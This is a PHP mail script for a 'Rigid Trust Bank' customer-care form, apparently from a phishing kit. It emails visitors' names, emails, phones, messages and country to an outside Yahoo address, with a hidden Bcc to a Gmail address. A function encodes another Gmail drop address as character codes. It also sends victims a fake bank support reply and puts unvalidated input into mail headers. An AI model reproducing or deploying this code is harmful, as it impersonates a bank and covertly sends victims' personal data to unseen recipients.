<?php
session_start();
error_reporting(0);
 

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
    // Compose a simple HTML email message
$message = '<html><body>';
    $message .= '<div style=" border:1px solid rgba(0, 0, 0, 0.3); border-radius:6px; box-shadow:1px 3px 2px rgba(0, 0, 0, 0.6); padding:10px;">';
    $message .= '<div style="padding:9px;">';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">First Name: '   . $_POST['fname']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Email: '    . $_POST['email']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">EnquiringAbout: '    . $_POST['EnquiringAbout']."\n" . ' </p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Contact: '   . $_POST['phone']."\n" . '</p>';
 
        $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Message:  '    . $_POST['message']."\n" . '</p>';
  
   
              $message .= '<p style="color:#000066; font-size:14px; font-weight:400">COUNTRY: '.$country.' </p>';
              $message .= '<p style="color:#000066; font-size:14px; font-weight:400">DATE: '.$adddate.' </p>';
$message .= '</div>';
$message .= '</body></html>';
    
    
    
    
    
    
    
   // customer message 
    $message2 = '<html><body>';
$message2 .= '<div style=" border:1px solid rgba(0, 0, 0, 0.3); border-radius:6px; box-shadow:1px 3px 2px rgba(0, 0, 0, 0.6); padding:10px;">';
$message .= '<div style="padding:9px;">';
     $message2 .= '<p style="color:#000066; font-size:14px; font-weight:400">Dear '   . $_POST['fname']."\n" . ',</p>';
    $message2 .= '<p style="color:#000066; font-size:14px; font-weight:400">Thank you for sending a message to Rigid Trust banks support care 24hours service <br>This is to inform you that your requet has been sent to us,Our Team will get to you shortly.  '   . $_POST['salary_frequency']."\n" . '</p>';    
   
    $message2 .= '<p style="color:#000066; font-size:14px; font-weight:400">.</p>';

$message2 .= '<p style="color:#000066; font-size:14px; font-weight:400">Kind Regards<br>Rigid Trust Bank Support Team <br>Email: support@rigidtrust.com</p>';

$message2 .= '</div>';
$message2 .= '</body></html>';
 
 




// change your email here 
$to ="gracerefill@yahoo.com";
$from = $_POST['email'];





// Create email headers
$subject = "WESITE CUSTOMER CARE";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: CUSTOMER CARE GRACEREFILL... '. $from ."\r\n".
$headers .= "Bcc: aturosandaval@gmail.com \r\n";
        'Reply-To: '. $from ."\r\n" .
        'X-Mailer: PHP/' . phpversion();
        
// customer email hearders
$subject2 = "YOU MESSAGE OUR TEAM";
$headers2 = "From:'GRACE REFILL SUPPORT TEAM'<support@gracerefil.com>\n";
$headers2 .= "Content-type:text/html;charset=UTF-8" . "\r\n";


{
mail($to,$subject,$message,$headers);
mail($from,$subject2,$message2,$headers2);
}

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
header("Location: index.html");
?>
    



